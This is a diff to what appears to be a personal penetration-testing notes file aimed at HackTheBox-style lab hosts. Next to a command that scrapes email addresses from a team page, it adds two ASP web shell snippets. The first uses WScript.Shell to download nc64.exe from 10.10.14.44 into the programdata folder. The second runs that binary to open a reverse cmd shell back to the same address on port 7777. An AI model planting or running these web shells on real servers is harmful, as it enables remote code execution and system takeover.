@@ -58,6 +58,25 @@ grep -c file < file1 eq cat file1 | grep -c file
 
 curl http://sneakycorp.htb/team.php | grep '@' | awk '{gsub(/<[^>]*>/,"");print;}' | tr -d ' ' > emails.txt
 
+asp rce(webshell&execute
+<%Function execStdOut(cmd)
+ Dim wsh: Set wsh = CreateObject( "WScript.Shell" )
+ Dim aRet: Set aRet = wsh.exec(cmd)
+ execStdOut = aRet.StdOut.ReadAll()
+ End Function
+ theOutput = execStdOut("curl 10.10.14.44/nc64.exe -o \programdata\nc64.exe")
+ response.write "Output: " & theOutput
+%>
+
+<%Function execStdOut(cmd)
+ Dim wsh: Set wsh = CreateObject( "WScript.Shell" )
+ Dim aRet: Set aRet = wsh.exec(cmd)
+ execStdOut = aRet.StdOut.ReadAll()
+ End Function
+ theOutput = execStdOut("\programdata\nc64.exe 10.10.14.44 7777 -e cmd")
+ response.write "Output: " & theOutput
+%>
+
 Integer-Overflow-to-Buffer-Overflow (IO2BO)
 
 
